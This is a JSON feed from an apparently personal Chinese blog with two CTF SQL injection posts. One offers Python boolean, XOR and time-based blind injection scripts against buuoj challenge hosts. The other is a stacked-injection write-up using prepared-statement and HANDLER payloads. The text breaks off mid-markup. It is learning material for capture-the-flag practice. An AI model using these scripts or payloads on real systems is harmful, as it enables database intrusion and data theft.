{
    "version": "https://jsonfeed.org/version/1",
    "title": "FanqieのBlog • All posts by \"sql\" tag",
    "description": "学习博客",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/08/17/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/",
            "url": "http://example.com/2021/08/17/ctfweb-%E5%90%84%E7%A7%8D%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC/",
            "title": "ctfweb-各种盲注脚本",
            "date_published": "2021-08-17T13:51:59.954Z",
            "content_html": "<p>以下的几个脚本都是自己写的（有参考别的大佬），代码可能不是最精简，但是还算顺眼</p>\n<p>核心算法都是<strong>二分法</strong>，不推荐时间盲注（速度硬伤）</p>\n<p>脚本 payload 参考题目：[第一章 web 入门] SQL 注入 - 2  / 极客大挑战 finilysql（buuctf）</p>\n<p><span id=\"more\"></span></p>\n<h1 id=\"1通过post传参的脚本\"><a class=\"anchor\" href=\"#1通过post传参的脚本\">#</a> 1. 通过 post 传参的脚本</h1>\n<hr>\n<p>用的时候修改 post 参数和个数</p>\n<h2 id=\"11-基于异或盲注布尔盲注等\"><a class=\"anchor\" href=\"#11-基于异或盲注布尔盲注等\">#</a> 1.1 基于<strong>异或盲注</strong>，<strong>布尔盲注</strong>等：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    high <span class=\"token operator\">=</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    low <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>low <span class=\"token operator\">+</span> high<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">while</span> high <span class=\"token operator\">></span> low<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1' or ascii (substr (database (),&#123;i&#125;,1))>&#123;mid&#125;#\"    #查库</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1' or ascii (substr ((select (group_concat (table_name)) from (information_schema.tables) where (table_schema)='note'),&#123;i&#125;,1))>&#123;mid&#125;#\"   #查表</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1' or ascii (substr ((select (group_concat (column_name)) from (information_schema.columns) where (table_name)='fl4g'),&#123;i&#125;,1))>&#123;mid&#125;#\"   #查列</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"1' or ascii(substr((seleCt(flag)from(fl4g)),</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1))></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">#\"</span></span>   <span class=\"token comment\">#查数据</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>            <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span>payload<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token string\">\"pass\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">'qwer'</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'u6216'</span> <span class=\"token keyword\">in</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>            low <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>            high <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>low <span class=\"token operator\">+</span> high<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span>       </pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">if</span> low <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>low<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"12-基于时间盲注\"><a class=\"anchor\" href=\"#12-基于时间盲注\">#</a> 1.2 基于<strong>时间盲注</strong>：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">'http://736aa374-b497-441f-9b6a-a1c91f9b182b.node4.buuoj.cn:81/login.php'</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    high <span class=\"token operator\">=</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    low <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>low <span class=\"token operator\">+</span> high<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">while</span> high <span class=\"token operator\">></span> low<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1' or if (ascii (substr (database (),&#123;i&#125;,1))>&#123;mid&#125;,sleep (2),1)#\"       #查库名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1'or if (ascii (substr ((seleCt (group_concat (table_name)) from (information_schema.tables) where (table_schema)='note'),&#123;i&#125;,1))>&#123;mid&#125;,sleep (2),1)#\"        #查表名</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1'or if (ascii (substr ((seleCt (group_concat (column_name)) from (information_schema.columns) where (table_name)='users'),&#123;i&#125;,1))>&#123;mid&#125;,sleep (2),1)#\"        #查列名</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"1'or if(ascii(substr((seleCt(flag)from(fl4g)),</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1))></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,sleep(2),1)#\"</span></span>       <span class=\"token comment\">#查数据</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span>payload<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token string\">\"pass\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">'qwer'</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span>        </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        last <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        now <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span> now <span class=\"token operator\">-</span> last <span class=\"token operator\">></span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>    </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            low <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            high <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>low <span class=\"token operator\">+</span> high<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">if</span> low <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>low<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"2通过get传参的脚本\"><a class=\"anchor\" href=\"#2通过get传参的脚本\">#</a> 2. 通过 get 传参的脚本</h1>\n<hr>\n<p>修改 url 和 文本</p>\n<h2 id=\"21-基于异或盲注布尔盲注等\"><a class=\"anchor\" href=\"#21-基于异或盲注布尔盲注等\">#</a> 2.1 基于异或盲注，布尔盲注等：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token builtin\">min</span> <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token builtin\">max</span> <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">min</span><span class=\"token operator\">&lt;</span><span class=\"token builtin\">max</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">min</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        payload<span class=\"token operator\">=</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"1^(ascii(substr(database(),</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1))></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">)#\"</span></span>       <span class=\"token comment\">#查库名</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#payload=f\"1^(ascii (substr ((select (group_concat (table_name)) from (information_schema.tables) where (table_schema)='geek'),&#123;i&#125;,1))>&#123;mid&#125;)#\"        #查表名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload=f\"1^(ascii (substr ((select (group_concat (column_name)) from (information_schema.columns) where (table_name)='F1naI1y'),&#123;i&#125;,1))>&#123;mid&#125;)#\"      #查列名</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">#payload=f\"1^(ascii (substr ((select (group_concat (password)) from (F1naI1y)),&#123;i&#125;,1))>&#123;mid&#125;)#\"       #查数据</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        response<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'ERROR'</span> <span class=\"token keyword\">in</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token builtin\">min</span> <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token builtin\">max</span><span class=\"token operator\">=</span>mid</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">min</span> <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        name <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">min</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"22-基于时间盲注\"><a class=\"anchor\" href=\"#22-基于时间盲注\">#</a> 2.2 基于时间盲注：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time </pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token builtin\">min</span> <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token builtin\">max</span> <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">min</span><span class=\"token operator\">&lt;</span><span class=\"token builtin\">max</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">min</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        payload<span class=\"token operator\">=</span><span class=\"token string-interpolation\"><span class=\"token string\">f\" \"</span></span>       <span class=\"token comment\">#查库名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload=f\" \"        #查表名</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">#payload=f\" \"      #查列名</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\">#payload=f\" \"       #查数据</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        last <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        response<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        now <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span> now <span class=\"token operator\">-</span> last <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token builtin\">min</span> <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token builtin\">max</span><span class=\"token operator\">=</span>mid</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">min</span> <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        name <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">min</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"3备注\"><a class=\"anchor\" href=\"#3备注\">#</a> 3. 备注</h1>\n<p>1.payload 不放了，这个做题慢慢积累，网上也都有，根据题目自己写</p>\n<p>2. 能不使用 sleep 就不使用，速度比其他的方法慢太多</p>\n<p>3. 在网不好的情况下可能会出现脚本打印的字符错误，不是代码问题</p>\n<p>4. 自己写的脚本可能不完善，有问题或者有建议留言，有需求也可以自改</p>\n<p>5. 遇到新的脚本或者方法再补充</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "sql"
            ]
        },
        {
            "id": "http://example.com/2021/08/01/(ctfwp)sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/",
            "url": "http://example.com/2021/08/01/(ctfwp)sql%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%E5%8F%8A%E9%A2%84%E7%BC%96%E8%AF%91%E7%9A%84%E5%AD%A6%E4%B9%A0/",
            "title": "(ctfwp)sql堆叠注入及预编译的学习",
            "date_published": "2021-08-01T07:01:31.153Z",
            "content_html": "<p>很久没有碰 sql 注入了，最近几天复习了一下，顺便掌握了点新的知识。</p>\n<p>好多题的 wp 我都懒得写了，挑一两道写吧</p>\n<p><span id=\"more\"></span></p>\n<p>先推一下两篇很有帮助的文章，以后自己复习用</p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ0NjU3ODk5L2FydGljbGUvZGV0YWlscy8xMDMyMzkxNDU/dXRtX21lZGl1bT1kaXN0cmlidXRlLnBjX3JlbGV2YW50Lm5vbmUtdGFzay1ibG9nLTIlN0VkZWZhdWx0JTdFQmxvZ0NvbW1lbmRGcm9tTWFjaGluZUxlYXJuUGFpMiU3RWRlZmF1bHQtMS5jb250cm9sJmFtcDtkZXB0aF8xLXV0bV9zb3VyY2U9ZGlzdHJpYnV0ZS5wY19yZWxldmFudC5ub25lLXRhc2stYmxvZy0yJTdFZGVmYXVsdCU3RUJsb2dDb21tZW5kRnJvbU1hY2hpbmVMZWFyblBhaTIlN0VkZWZhdWx0LTEuY29udHJvbA==\">[强网杯 2019] 随便注 的三种解法</span></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNDI3NDgyL2FydGljbGUvZGV0YWlscy8xMDk4OTg5MzQ=\">MySQL 之 handler 的详细使用及说明</span></p>\n<h2 id=\"1强网杯-2019随便注\"><a class=\"anchor\" href=\"#1强网杯-2019随便注\">#</a> 1.[强网杯 2019] 随便注</h2>\n<p>1. 先试试万能密码  <code>1‘ or 1=1 #</code></p>\n<p>有回显，这说明可以注入：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvbU85NExhNkJjWHlRQWplLnBuZw==\">https://i.loli.net/2021/08/01/mO94La6BcXyQAje.png</span>&quot; alt=&quot;1.1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>做个 FUZZ 测试，不放图了，发现 select 等关键词都被 ban 了，无法联合，只能少量报错注入。</p>\n<p>因此考虑堆叠注入。</p>\n<p>查库名：</p>\n<pre><code class=\"language-mysql\">1'; show databases;#  \n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvTUZJNGJxUXV3SkxTR1hOLnBuZw==\">https://i.loli.net/2021/08/01/MFI4bqQuwJLSGXN.png</span>&quot; alt=&quot;1.2.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p2--&gt;</p>\n<p>查表名:</p>\n<pre><code class=\"language-mysql\">1'; show tables;#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvdTVlelgxR0Nadk1ZeG9RLnBuZw==\">https://i.loli.net/2021/08/01/u5ezX1GCZvMYxoQ.png</span>&quot; alt=&quot;1.3.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p3--&gt;</p>\n<p>显然 flag 应该在长的那串数字里，查列名:</p>\n<pre><code class=\"language-mysql\"> 1'; show columns from `1919810931114514`;#\n</code></pre>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvUVhod1BsQTRCazFheUdWLnBuZw==\">https://i.loli.net/2021/08/01/QXhwPlA4Bk1ayGV.png</span>&quot; alt=&quot;1.4.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p4--&gt;</p>\n<p>flag 在这里，但是显示不出来 flag，很尴尬，于是学会了两个方法，</p>\n<p>第一种比较常规，第二种比较万能。</p>\n<p><strong>第一种：预编译</strong></p>\n<p>因为 select 被 ban 了，可以考虑 <strong>16 进制编码</strong>绕过，也可以考虑<strong>拼接语句</strong>绕过，我用了拼接语句。</p>\n<p>先构造语句</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">select</span> <span class=\"token operator\">*</span> <span class=\"token keyword\">from</span> <span class=\"token punctuation\">`</span><span class=\"token number\">1919810931114514</span><span class=\"token punctuation\">`</span></pre></td></tr></table></figure><p>进行预编译：</p>\n<pre><code class=\"language-mysql\">1'; SET @a= concat('sel','ect','* from `1919810931114514`'); prepare flag from @a; execute flag;#\n</code></pre>\n<p>注释一下：</p>\n<ol>\n<li>定义：    SET @变量 = 语句（命令）</li>\n<li>预编译：   prepare name from 语句</li>\n<li>执行：   excute name</li>\n</ol>\n<hr>\n<p><strong>第二种：handler 方法</strong></p>\n<p>MySQL 除了可以使用 select 查询表中的数据，也可使用 handler 语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过 handler 语句并不具备 select 语句的所有功能。它是 MySQL 专用的语句，并没有包含到 SQL 标准中。</p>\n<p><strong>此处需要用到的语法：</strong></p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMDEvdkxGaDllTXFhNkRDOE9XLnBuZw==\">https://i.loli.net/2021/08/01/vLFh9eMqa6DC8OW.png</span>&quot; alt=&quot;1.5.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p5--&gt;</p>\n<p>构造 payload：</p>\n<pre><code class=\"language-mysql\">1'; handler `1919810931114514` open as a; handler a read first;#\n</code></pre>\n<p>随便哪个 payload 都可得到 flag：</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" 